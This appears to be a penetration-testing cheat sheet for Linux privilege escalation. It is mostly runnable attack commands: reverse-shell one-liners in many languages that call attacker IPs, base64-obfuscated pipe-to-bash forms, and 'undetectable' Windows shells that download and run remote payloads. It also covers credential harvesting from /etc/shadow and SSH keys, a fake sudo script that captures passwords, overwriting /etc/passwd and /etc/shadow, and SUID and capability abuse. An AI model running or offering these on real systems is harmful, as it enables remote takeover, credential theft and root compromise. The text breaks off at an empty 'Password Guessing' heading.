# Linux Priv Esca

### Tools

```shellscript
**Tools** 
https://github.com/ShutdownRepo/shellerator
https://github.com/0x00-0x00/ShellPop
https://github.com/cybervaca/ShellReverse
https://liftoff.github.io/pyminifier/
https://github.com/xct/xc/
https://weibell.github.io/reverse-shell-generator/
https://github.com/phra/PEzor
```

### Linux

```shellscript
# Bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 172.21.0.0 1234 >/tmp/f
nc -e /bin/sh 10.11.1.111 4443
bash -i >& /dev/tcp/IP ADDRESS/8080 0>&1

# Bash B64 Ofuscated
{echo,COMMAND_BASE64}|{base64,-d}|bash 
echo${IFS}COMMAND_BASE64|base64${IFS}-d|bash
bash -c {echo,COMMAND_BASE64}|{base64,-d}|{bash,-i} 
echo COMMAND_BASE64 | base64 -d | bash 

# Perl
perl -e 'use Socket;$i="IP ADDRESS";$p=PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

# Python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("IP ADDRESS",PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
python -c '__import__('os').system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.9 4433 >/tmp/f')-1\'

# Python IPv6
python -c 'import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect(("dead:beef:2::125c",4343,0,2));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=pty.spawn("/bin/sh");' 

# Ruby
ruby -rsocket -e'f=TCPSocket.open("IP ADDRESS",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
ruby -rsocket -e 'exit if fork;c=TCPSocket.new("[IPADDR]","[PORT]");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'

# PHP:
# /usr/share/webshells/php/php-reverse-shell.php
# http://pentestmonkey.net/tools/web-shells/php-reverse-shell
php -r '$sock=fsockopen("IP ADDRESS",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
$sock, 1=>$sock, 2=>$sock), $pipes);?>

# Golang
echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","IP ADDRESS:8080");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go

# AWK
awk 'BEGIN {s = "/inet/tcp/0/IP ADDRESS/4242"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null

https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md
https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell

# Socat
socat TCP4:10.10.10.10:443 EXEC:/bin/bash
# Socat listener
socat -d -d TCP4-LISTEN:443 STDOUT
```

### Windows

```shellscript
# Netcat
nc -e cmd.exe 10.11.1.111 4443

# Powershell
$callback = New-Object System.Net.Sockets.TCPClient("IP ADDRESS",53);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$callback.Close()
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.11',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"

# Undetectable:
# https://0xdarkvortex.dev/index.php/2018/09/04/malware-on-steroids-part-1-simple-cmd-reverse-shell/
i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc

# Undetectable 2:
# https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15
# 64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
# 32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```

### Tips

```shellscript
#  rlwrap
# https://linux.die.net/man/1/rlwrap
# Connect to a netcat client:
rlwrap nc [IP Address] [port]
# Connect to a netcat Listener:
rlwrap nc -lvp [Localport]

# Linux Backdoor Shells: 
rlwrap nc [Your IP Address] -e /bin/sh 
rlwrap nc [Your IP Address] -e /bin/bash
rlwrap nc [Your IP Address] -e /bin/zsh
rlwrap nc [Your IP Address] -e /bin/ash

# Windows Backdoor Shell: 
rlwrap nc -lv [localport] -e cmd.exe
```

## Linux Privilege Escalation <a href="#linux-privilege-escalation" id="linux-privilege-escalation"></a>

Privilege Escalation (PrivEsc) is the act of exploiting a bug, a design flaw, or a configuration oversight in an operating system or software application to gain elevated access to resources that are normally protected from an application or user. Once you have root privileges on Linux, you can get sensitive information in the system.

### Automation <a href="#automation" id="automation"></a>

There are some tools for investigating automatically.

* [LinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS)
* [Linux Exploit Suggester](https://github.com/mzet-/linux-exploit-suggester)
* [Linux Smart Enumeration](https://github.com/diego-treitos/linux-smart-enumeration)

### Messages When Logged In <a href="#messages-when-logged-in" id="messages-when-logged-in"></a>

After logged in the target system, don’t miss the messages. We might find interesting information.

### OS Information <a href="#os-information" id="os-information"></a>

```shellscript
# Operating system
uname -o
# Architecture
uname -m

# OS kernel version
cat /etc/os-release
cat /etc/*release
cat /proc/version

# LSB (Linux Standard Base) and distribution information
cat /etc/lsb-release
lsb_release -a
```

#### Find OS/Kernel Vulnerability <a href="#find-oskernel-vulnerability" id="find-oskernel-vulnerability"></a>

If we run **`uname -a`** and get the OS version, search vulnerabilities.

```
Linux examplehost 4.4.0-31-generic #50-Ubuntu SMP Wed Jul 13 00:07:12 UTC 2016 x86_64 x86_64 x86_64 GNU/Linux
```

For example above, we can search **`ubuntu 4.4.0-31-generic`** in search engines.

### Interesting Information <a href="#interesting-information" id="interesting-information"></a>

```shellscript
# Current user information
whoami
id
id <username>
groups
groups <username>

# Users and passwords
cat /etc/passwd
cat /etc/shadow
# for NSS (Name Service Switch)
getent passwd

# Bash files
# If we have the write permission for .bashrc or .profile, 
# we can write arbitrary command to any line in that files.
cat /home/<user>/.bash_history
cat /home/<user>/.bash_logout
cat /home/<user>/.bash_profile
cat /home/<user>/.bashrc
cat /home/<user>/.profile
cat /home/<user>/.shrc
cat /home/<user>/.zshrc
cat /root/.bash_history
cat /root/.bash_logout
cat /root/.bash_profile
cat /root/.bashrc
cat /root/.shrc
cat /root/.zshrc
cat /root/.profile
# System-wide configurations
cat /etc/bash.bashrc
cat /etc/profile
cat /etc/profile.d/bash_completion.sh

# Bash logs
cat /var/log/bash.log

# Environment variables
env
printenv
cat /etc/environment
cat /proc/self/environ
cat /proc/<pid>/environ
echo $PATH

# Positional arguments
echo $0
echo $1
echo $2

# Current shell
echo $SHELL
# if not '/bin/bash' or '/bin/sh', try updating path:
export SHELL=/bin/bash

# List available shells
cat /etc/shells

# Host information
hostname
# Alias
hostname -a
# DNS
hostname -d
# IP address for the host name
hostname -i
# All IP address for the host
hostname -I

# Apache
cat /var/log/apache/access.log
cat /var/log/apache/error.log
cat /var/log/apache2/access.log
cat /var/log/apache2/error.log
cat /etc/apache2/.htpasswd
cat /etc/apache2/ports.conf
cat /etc/apache2/sites-enabled/domain.conf
cat /etc/apache2/sites-available/domain.conf
cat /etc/apache2/sites-available/000-default.conf
cat /usr/local/apache2/conf/httpd.conf
ls -al /usr/local/apache2/htdocs/

# Nginx
cat /var/log/nginx/access.log
cat /var/log/nginx/error.log
cat /etc/nginx/nginx.conf
cat /etc/nginx/conf.d/.htpasswd
cat /etc/nginx/sites-available/example.com.conf
cat /etc/nginx/sites-enabled/example.com.conf
cat /usr/local/nginx/conf/nginx.conf
cat /usr/local/etc/nginx/nginx.conf

# PHP web conf
cat /etc/php/x.x/apache2/php.ini
cat /etc/php/x.x/cli/php.ini
cat /etc/php/x.x/fpm/php.ini

# Cron jobs
cat /etc/cron*
cat /etc/crontab
cat /etc/cron.d/*
cat /etc/cron.daily/*
cat /etc/cron.hourly/*
cat /etc/cron.monthly/*
cat /etc/cron.weekly/*
cat /var/spool/cron/*
cat /var/spool/cron/crontabs/*
# List all cron jobs
crontab -l
crontab -l -u username

# Network
cat /etc/hosts

# Network
ip a
ifconfig
# List computers which communicate with the current computer recently
arp -a

# Routing table
route
ip route show
# -r: route
netstat -r
# -n: don't resolve name
netstat -rn

# Firewall
# -L: List the rules in all chains
# -v: Verbose output
# -n: Numeric output of addresses and ports
iptables -L -v -n

# Messages
cat /etc/issue
cat /etc/motd
cat /etc/update-motd.d/00-header

# MySQL (MariaDB)
cat /etc/mysql/my.cnf
cat /etc/mysql/debian.cnf
cat /etc/mysql/mariadb.cnf
cat /etc/mysql/conf.d/mysql.cnf
cat /etc/mysql/mysql.conf.d/mysql.cnf

# Nameserver
cat /etc/resolv.conf

# NFS settings
cat /etc/exports

# PAM
cat /etc/pam.d/passwd

# Sudo config
cat /etc/sudoers
cat /etc/sudoers.d/usersgroup

# SSH config
cat /etc/ssh/ssh_config
cat /etc/ssh/sshd_config

# List of all groups on the system
cat /etc/group

# File system table
cat /etc/fstab

# Xpad (sensitive information e.g. user password)
cat .config/xpad/*

# SSH keys
ls -la /home /root /etc/ssh /home/*/.ssh/; locate id_rsa; locate id_dsa; find / -name id_rsa 2> /dev/null; find / -name id_dsa 2> /dev/null; find / -name authorized_keys 2> /dev/null; cat /home/*/.ssh/id_rsa; cat /home/*/.ssh/id_dsa

# Root folder of web server
ls /var/www/

# Sometimes, we find something...
ls -la /opt/
ls -la /srv/

# Temporary files
ls -la /dev/shm/
ls -la /tmp
ls -al /var/tmp

# Services
ls -al /etc/systemd/system/
ls -al /lib/systemd/system/
cat /etc/inetd.conf

# Mails
ls -la /var/mail
ls -la /var/spool/mail

# LDAP config
cat /etc/ldap/ldap.conf

# Security policies
ls -la /etc/apparmor.d/
# Check each policy
cat /etc/apparmor.d/usr.bin.sh

# Check outdated packages
apt list --upgradable
apt list --upgradable | grep polkit

# CPU usage
htop

# Find files modified recently (replace the datetimes)
find / -type f -newermt "2025-04-01 00:00:00"  ! -newermt "2025-04-01 23:59:59"
```

### Kernel Information <a href="#kernel-information" id="kernel-information"></a>

```shellscript
# Kername name
uname -s
# Kernel release version
uname -r
# Kernel version
uname -v

# Kernel sources
ls -l /usr/src/

# Parameters that were passed to the kernel at boot time
cat /proc/cmdline

# List loaded file system drivers
# -v nodev: Exclude devices which are not mounted (nodev).
cat /proc/filesystems | grep -v nodev

# vmlinuz (compressed kernel)
ls -lh /boot | grep vmlinuz

# Symbol tables
head /boot/System.map-`uname -r`
head /proc/kallsyms

# List kernel modules
lsmod
cat /proc/modules
ll /lib/modules/

# List symbols and addresses of kernel modules
cat /proc/kallsyms

# Get module information
modinfo <module_name>
modinfo example.ko

# Investigate kernel module file
strings example.ko | less
objdump -D example.ko

# CPU information
cat /proc/cpuinfo

# Secuirty properties
checksec --kernel <module>
# e.g.
checksec --kernel bzImage

# Kernel logs
dmesg

# --human: Human readable output
dmesg --human
# --follow: Wait for new messages
dmesg --follow

# -f: Restrict defined facilities
dmesg -f auth
dmesg -f kern
dmesg -l mail
dmesg -l syslog
dmesg -f user

# -l: Restrict defined levels
dmesg -l alert
dmesg -l crit
dmesg -l err
dmesg -l info
dmesg -l user
```

### Hardware Information <a href="#hardware-information" id="hardware-information"></a>

```shellscript
# List hardware
lshw
# List buses
ls /proc/bus
# List connected usb devices
lsusb
ls /proc/bus/usb/devices
# List pci devices
lspci
ls /proc/bus/pci
```

### SSH Public Key Forgery <a href="#ssh-public-key-forgery" id="ssh-public-key-forgery"></a>

If we have write permission to `.ssh/authorized_keys`, we can insert our SSH public key to this file and login as the user.

In local machine, generate SSH private/public keys as below:

```shellscript
ssh-keygen -f key
cat key.pub
# Copy the output!
```

In target machine, paste the content of the public key to `.ssh/authorized_keys`:

```
echo '<PUBKEY_CONTENT>' >> .ssh/authorized_keys
```

In local machine, we can login using the private key:

```
chmod 600 key
ssh user@<target-ip> -i key
```

### Open Ports <a href="#open-ports" id="open-ports"></a>

```shellscript
# -a: display all sockets
# -n: don't resolve names
# -p: display PID/Program name for sockets
# -t: tcp
# -u: udp
netstat -anptu
# -l: display listening server sockets
netstat -lntu

# -l: Display listening sockets
# -n: Don't resolve service names
# -t: TCP only
# -u: UDP only
ss -lntu
# -p: Show process using sockets
ss -nptu
```

#### Access Internal Services From Outside <a href="#access-internal-services-from-outside" id="access-internal-services-from-outside"></a>

If we discover a listenning port that cannot be accessed externally as below, we can access the port by port forwarding or reverse port forwarding.

```
tcp  0  0  127.0.0.1:8080  0.0.0.0:*  LISTEN  -                   
```

There are various methods to do that.

*   **Option 1. Port Forwarding with SSH**

    If we have the SSH credential, we can easily port forward as below in our local machine:

    ```
    ssh -L 8080:127.0.0.1:8080 user@<target-ip>
    ```

    See for details: [Local Port Forwarding with SSH](https://exploit-notes.hdks.org/exploit/network/port-forwarding/ssh/)
*   **Option 2. Reverse Port Forwarding with Chisel**

    If we don't have the SSH credential, we can reverse port forward using Chisel.\
    See for details: [Reverse Port Forwarding with Chisel](https://exploit-notes.hdks.org/exploit/network/port-forwarding/chisel/)

Now we can access to `http://localhost:8080` in local browser. That means we now connected to `http://127.0.0.1:8080` of remote machine.

### Running Processes <a href="#running-processes" id="running-processes"></a>

```shellscript
# Get a current process id (PID) and the parent process id (PPID)
echo $$ $PPID

# Display the currently-running processes.
ps
# -f: Process hierarchy (forest)
ps fax
ps aux
ps aux | grep ping
# If the right side of the result is cut off, pipe with cat command.
ps aux | cat
ps aux | cat | grep ping

# https://tryhackme.com/r/room/linuxprocessanalysis
# -e: Every process
# -F: Extra full format
# -H: Hierarchy
ps -eFH | less

# Monitor all processes
top
# -p: Specific processes
top -p 1,100,103

# Get all processes ids by name
pidof /bin/bash
pidof python3

lsof
# -p: PID
lsof -p 1234
# -i: Display the information of network connections.
# -n: Not resolve IP addresses.
# -P: Display port numbers.
lsof -i -n -P
```

#### Using PSPY <a href="#using-pspy" id="using-pspy"></a>

By using [**pspy**](https://github.com/DominicBreuker/pspy), we can fetch processes without root privileges.

```
./pspy64

# -p: print commands to stdout
# -f: print file system events to stdout
# -i: interval in milliseconds
./pspy64 -pf -i 1000
```

#### Dump Information <a href="#dump-information" id="dump-information"></a>

If some process (like ping) is running as root, you may be able to capture the interesting information using tcpdump.

```
# -i lo: specify interface (lo: loopback address, localhost)
# -A: print each packet in ASCII
tcpdump -i lo -A
```

#### Override Command <a href="#override-command" id="override-command"></a>

If some command is executed in processes as our current user, we can override the command to our arbitrary command.\
Assume **`sudo cat /etc/shadow`** command is executed in the process.\
&#xNAN;**`sudo`** command asks the password of the current user. So if we don't have the current user's password yet, worth getting the password.

To do so, we can create the fake **`sudo`** command under the current user’s home directory.

```
mkdir /home/<user>/bin
touch /home/<user>/bin/sudo
chmod +x /home/<user>/bin/sudo
```

Then insert a payload in **`/home/<user>/bin/sudo`**.\
This **`sudo`** command reads the value of the password in prompt and write the value to **“password.txt”**.

```
#!/bin/bash

read password
echo $password >> /home/<user>/password.txt
```

In addition, we need to export the **`/home/<user>/bin`** to the PATH on the top of the **`/home/<user>/.bashrc`**.

```
export PATH=/home/<user>/bin:$PATH
```

Wait a while, we should see the **“password.txt”** is created.

```
cat password.txt
```

Now we get the current user password.

### Process Tracing <a href="#process-tracing" id="process-tracing"></a>

Sometimes we can retrieve the sensitive information by reading sequential processes with `stract`.

```
strace -e read -p `ps -ef | grep php | awk '{print $2}'`
```

### Running Services <a href="#running-services" id="running-services"></a>

To list all running services in Linux, use the following command.

```
systemctl --type=service --state=running
systemctl list-unit-files | grep enabled

# Show status for each service
systemctl status <service_name>
```

#### Service Logs <a href="#service-logs" id="service-logs"></a>

Using `journalctl`, we can see logs of services running on `systemd`.

```shellscript
# All logs
journalctl

# Current boot
journalctl -b

# Kernel messages from boot
journalctl -k

# Recenct logs
# -e: Jump to the end in the pager
# -x: Details
journalctl -e
journalctl -ex

# Shog logs from specified unit
journalctl -u httpd
journalctl -u sshd
```

### Logging <a href="#logging" id="logging"></a>

```shellscript
# User Logged-in
# List currently logged in users
who
watch who
# List last logged in users
last | head
last root | head
# List the most recent login of all users
lastlog
# List the BAD login attempts such as entering incorrect password
lastb

# su and ssh logins
cat /var/log/auth.log
cat /var/log/secure
cat /var/log/auth.log | grep chpasswd
cat /var/log/auth.log | grep root
strings /var/log/auth.log | grep chpasswd
strings /var/log/auth.log | grep root
```

#### Watch Logs in Real Time <a href="#watch-logs-in-real-time" id="watch-logs-in-real-time"></a>

We can watch logs in real time as below. `-f` option is used for dynamically outputting logs.

```
tail -f /var/log/syslog
```

### Sensitive Files with Given Keywords <a href="#sensitive-files-with-given-keywords" id="sensitive-files-with-given-keywords"></a>

The **"find"** command searches files in the real system.

```shellscript
find / -name "*.txt" 2>/dev/null
find /opt -name "*.txt" 2>/dev/null
find / -name "passwd" 2>/dev/null
find / -name "authorized_keys" 2>/dev/null
find / -name "users" 2>/dev/null
find / -name "*user*" 2>/dev/null
find / -name "secret.key" -or -name "secret" 2>/dev/null
find / -name "credential*.txt" 2>/dev/null
find / -name "*secret*" -or -name "*credential*" 2>/dev/null
find / -name "*root*" -or -name "*password*" 2>/dev/null
find / -name "*.key" -or -name "*.db" 2>/dev/null
find / -name "*data*" 2>/dev/null
find / -name ".env" 2>/dev/null
find / -name "*flag*" 2>/dev/null

# SQL files
find / -name "*.sql" 2>/dev/null
strings example.sql

# Backup files may contain sensitive information
find / -name "*backup*" 2>/dev/null
find / -name "*.bak*" 2>/dev/null
find / -name "*.back*" 2>/dev/null
find / -name "*.old" 2>/dev/null

# Histories
find / -name "*history*" 2>/dev/null

# Backup files for /etc/shadow.
# ex. /var/shadow.bak
find / -name *shadow* 2>/dev/null

# Kerberos
find / -name "*.keytab" 2>/dev/null

# -user: Specify the file owner
find / -user www-data 2>/dev/null
# -group Specify the group
find / -group www-data 2>/dev/null

# Executable files
find / -type f -executable 2>/dev/null

# ----------------------------------------
# Find more faster than `find` command.
locate data
locate flag
locate flag*.txt
locate *flag*
locate password
locate *password*
locate *save*
locate *save.txt
locate user.txt
locate user*
locate *user*
locate root.txt
locate *root*
locate .db
locate .txt
```

#### Exclude Path <a href="#exclude-path" id="exclude-path"></a>

We can exclude specific directory with `-not -path` option of `find` command.

```
find / -name "*.txt" -not -path "/usr/share" 2>/dev/null
```

### SUID/SGID (Set User ID/ Set Group ID) <a href="#suidsgid-set-user-id-set-group-id" id="suidsgid-set-user-id-set-group-id"></a>

It allows users to run an executable as root privilege.

```shellscript
# SUID
find / -type f -perm -u=s 2>/dev/null
find / -type f -perm -04000 2>/dev/null
find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null

# SGID
find / -type f -perm -g=s 2>/dev/null
find / -type f -perm -02000 2>/dev/null
find / -user root -perm -2000 -exec ls -ldb {} \; 2>/dev/null
```

If you'll get some SUID files, research the information of them using [**GTFOBins**](https://gtfobins.github.io/).

#### Find <a href="#find" id="find"></a>

If the "find" command is set as SUID, you can execute some commands as root privileges.

```
find ./ -exec "whoami" \;
find /etc/shadow -exec cat {} \;
find /root -exec ls -al {} \;
```

#### Cputils <a href="#cputils" id="cputils"></a>

If the "cputils" is set as SUID, you can copy the sensitive file to another one.

```
cputils

Enter the name of source file: /home/<user>/.ssh/id_rsa
Enter the name of target file: /tmp/id_rsa
```

#### Pandoc <a href="#pandoc" id="pandoc"></a>

1. Copy **`/etc/passwd`** and Update the Root Line

```
cp /etc/passwd .
vim passwd
```

Then update **"root:x:..."** to **"root:password123:..."**.

1. Replace with Our New Passwd File

Using **`pandoc`** command, we can replace the original **`/etc/passwd`** with our updated **`passwd`** file.

```
pandoc ./passwd -t plain -o /etc/passwd
```

Now we can login as root using new password.

```
su root
Password: password123
```

#### Firejail <a href="#firejail" id="firejail"></a>

[This exploit](https://www.openwall.com/lists/oss-security/2022/06/08/10/1) is useful.

```shellscript
# Download it in local machine
wget https://www.openwall.com/lists/oss-security/2022/06/08/10/1 -O exploit.py

# Transfer it to target machine
wget http://<local-ip>:8000/exploit.py
python3 exploit.py &
firejail --join=<PID>
su -
```

### Writable Directories & Files <a href="#writable-directories-files" id="writable-directories-files"></a>

```
# Writable directories
find / -writable 2>/dev/null | cut -d "/" -f 2,3 | sort -u

# System service files
find / -writable -name "*.service" 2>/dev/null
```

### Capabilities <a href="#capabilities" id="capabilities"></a>

To find files that are set capabilities.

```
getcap -r / 2>/dev/null
```

#### cap\_chown <a href="#cap_chown" id="cap_chown"></a>

First we need to check the current user id by executing 'id' command.

```
id

uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Then execute the following command to modify the file owner to the current user.\
Replace the attribute numbers with the current user id.

```
# Python
python -c 'import os;os.chown("/etc/shadow",33,33)'

# Ruby
ruby -e 'require "fileutils"; FileUtils.chown(33, 33, "/etc/shadow")'
# directories also can be modified.
ruby -e 'require "fileutils"; FileUtils.chown(33, 33, "/root")'
```

#### cap\_setuid <a href="#cap_setuid" id="cap_setuid"></a>

```
# Perl
perl -e 'use POSIX (setuid); POSIX::setuid(0); exec "/bin/bash";'

# PHP
php -r "posix_setuid(0); system('$CMD');"

# Python
python -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

#### cap\_net\_raw <a href="#cap_net_raw" id="cap_net_raw"></a>

```
# Tcpdump - we can sniff sensitive information by running tcpdump for a while.
tcpdump -i lo -A
```

#### cap\_dac\_read\_search <a href="#cap_dac_read_search" id="cap_dac_read_search"></a>

Bypass file read permission checks and directory read and execute permission checks.

```
# Tar (https://gtfobins.github.io/gtfobins/tar/)
LFILE=/etc/shadow
tar xf "$LFILE" -I '/bin/sh -c "cat 1>&2"'
```

### Set Capabilities <a href="#set-capabilities" id="set-capabilities"></a>

```
setcap cap_setuid+ep /path/to/binary
```

If you found the **setcap** with **SUID**, you can manipulate commands like Python.

```
cp /usr/bin/python3 /home/<current-user>/python3
setcap cap_setuid+ep /home/<current-user>/python3
```

Then get a root shell.

```
/home/<current-user>/python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

### Override /etc/passwd, /etc/shadow <a href="#override-etcpasswd-etcshadow" id="override-etcpasswd-etcshadow"></a>

#### /etc/passwd <a href="#etcpasswd" id="etcpasswd"></a>

If we have write permission of **`/etc/passwd`** by some means, we can modify this file as desired for us. First check the content of that file with **`cat /etc/passwd`**.

```
root:x:0:0:root:/root:/bin/sh
...
```

By removing this `x` character in the root line, we can become root without password. Below

```
root::0:0:root:/root:/bin/sh
...
```

After that, we can get a shell as root using the following command.

```
su root
```

#### /etc/shadow <a href="#etcshadow" id="etcshadow"></a>

If we have write permission of **`/etc/shadow`** by some means, we can modify the password for each user.\
First of all, create a new password using **`openssl`**.

```
# -6: sha512 algorithm
# password: this is the root password
openssl passwd -6 salt=salt password

# output
$6$salt$IxDD3jeSOb5eB1CX5LBsqZFVkJdido3OUILO5Ifz5iwMuTS4XMS130MTSuDDl3aCI6WouIL9AjRbLCelDCy.g.
```

After generating the hash, update the root password hash to this hash (**`$6$salt$I…`**) in **`/etc/shadow`**.

```
root:$6$salt$IxDD3jeSOb5eB1CX5LBsqZFVkJdido3OUILO5Ifz5iwMuTS4XMS130MTSuDDl3aCI6WouIL9AjRbLCelDCy.g.:19532:0:99999:7:::
```

Now we can get a shell as root with the password "password".

```
su root
# password: password
```

### Sensitive Contents in Files <a href="#sensitive-contents-in-files" id="sensitive-contents-in-files"></a>

```shellscript
# -r: recursive
# -n: line number
# -i: ignore case
grep -rni root ./
grep -rni password ./
grep -rni passwd ./
grep -rni db_password ./
grep -rni db_passwd ./

# Find user's information
grep -rni root ./
grep -rni john ./

# -e: OR Searching
grep -re admin -re root -re credential -re password ./
grep -re secret -re key ./

# -v: Exclude
grep -rni password -v node_modules ./

# -E: regex
grep -riE 'flag{.*}' ./

# IP Address Searching
grep -rE -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" ./

# -h: no output filenames
grep -h root ./
```

### Disks (Drives) <a href="#disks-drives" id="disks-drives"></a>

List disks information on the target system.

```
# Find mounted folders
findmnt
# List information about block drives
lsblk
# or
fdisk -l
# or
ls -al /dev | grep disk

# --------------------------------------------------

# Result examples
NAME    MAJ:MIN RM SIZE RO TYPE MOUNTPOINT
xvda    202:0    0  40G  0 disk 
└─xvda1 202:1    0  40G  0 part /etc/hosts
```

If we find the drives, we can mount it.

```
mkdir -p /mnt/tmp
mount /dev/xvda1 /mnt/tmp
```

### Crack User Passwords <a href="#crack-user-passwords" id="crack-user-passwords"></a>

If we can access **/etc/passwd** and **/etc/shadow** as well, we can crack user passwords using **unshadow** and **John The Ripper**.

#### 1. Copy Files <a href="#id-1-copy-files" id="id-1-copy-files"></a>

```
cp /etc/passwd ./passwd.txt
cp /etc/shadow ./shadow.txt
```

#### 2. Combines Two Files <a href="#id-2-combines-two-files" id="id-2-combines-two-files"></a>

```
unshadow passwd.txt shadow.txt > passwords.txt
```

#### 3. Crack Passwords <a href="#id-3-crack-passwords" id="id-3-crack-passwords"></a>

```
john --wordlist=wordlist.txt passwords.txt

# If the hash in /etc/shadow contains the $y$ prefix, specify the hash format to "crypt".
# btw, $ye$ is the scheme of the yescrypt.
john --format=crypt --wordlist=wordlist.txt passwords.txt
```

### Execute Commands as Root Privilege <a href="#execute-commands-as-root-privilege" id="execute-commands-as-root-privilege"></a>

#### Change Shebang in Shell Script <a href="#change-shebang-in-shell-script" id="change-shebang-in-shell-script"></a>

Add "-p" option at the first line to execute the script as root privilege.

```
#!/bin/bash -p
whoami
```

#### Use the Set User ID (SUID) <a href="#use-the-set-user-id-suid" id="use-the-set-user-id-suid"></a>

If you can change permission of the **/bin/bash** , add **SUID** to the file.

```
chmod 4755 /bin/bash
```

Then you execute it as root privilege by adding "-p" option.\
You'll be able to pwn the target shell.

```
user@machine:~/$ /bin/bash -p
root@machine:~/$ whoami
root
```

### Update Sensitive Information <a href="#update-sensitive-information" id="update-sensitive-information"></a>

#### 1. Change Password of Current User <a href="#id-1-change-password-of-current-user" id="id-1-change-password-of-current-user"></a>

We need to know the current user's password.

```
echo -n '<current-password>\n<new-password>\n<new-password>' | passwd
```

#### 2. Add Another Root User to /etc/shadow <a href="#id-2-add-another-root-user-to-etcshadow" id="id-2-add-another-root-user-to-etcshadow"></a>

1.  **Generate New Password**

    ```
    # -6: SHA512
    openssl passwd -6 -salt salt password
    ```

    Copy the output hash.
2.  **Add New Line to /etc/shadow in Target Machine**

    You need to do as root privileges.

    ```
    echo '<new-user-name>:<generated-password-hash>:19115:0:99999:7:::' >> /etc/shadow
    ```
3.  **Switch to New User**

    To confirm, switch to generated new user.

    ```
    su <new-user>
    ```

### Display the Content of Files You Don't Have Permissions <a href="#display-the-content-of-files-you-dont-have-permissions" id="display-the-content-of-files-you-dont-have-permissions"></a>

Using **"more"** command.

#### 1. Make the Terminal's Window Size Smaller <a href="#id-1-make-the-terminals-window-size-smaller" id="id-1-make-the-terminals-window-size-smaller"></a>

#### 2. Run "more" Command <a href="#id-2-run-more-command" id="id-2-run-more-command"></a>

The text like "--More--(60%)" will be appeared.

#### 3. Press 'v' on Keyboard to Enter Vim Mode <a href="#id-3-press-v-on-keyboard-to-enter-vim-mode" id="id-3-press-v-on-keyboard-to-enter-vim-mode"></a>

#### 4. Enter ':e \~/somefile' <a href="#id-4-enter-e-somefile" id="id-4-enter-e-somefile"></a>

### Password Guessing <a href="#password-guessing" id="password-guessing"></a>

